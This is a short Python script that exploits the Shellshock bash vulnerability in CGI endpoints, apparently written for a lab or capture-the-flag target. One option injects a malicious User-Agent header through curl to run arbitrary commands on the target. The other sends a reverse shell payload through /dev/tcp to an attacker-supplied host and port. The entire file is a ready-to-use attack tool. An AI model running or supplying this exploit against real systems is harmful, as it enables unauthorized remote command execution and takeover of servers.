import os
print ("[1] cgi_bin bash command \n [2] shell me cgi_bin")
option = input("type your option : ")
viln_file = input("print viln url exp (http://10.10.190.166/cgi-bin/test.cgi) : ")
if option == "1" : 
    while True :
        command = input("$ ")
        os.system(''' curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c '''+command+'''" '''+viln_file)
if option == "2" : 
    LHOST = input("LHOST : ")
    LPORT = input("LPORT : ")
    os.system("""curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c /bin/bash -i >& /dev/tcp/"""+LHOST+"""/"""+LPORT+""" 0>&1" """+viln_file)
    print("shell was created")
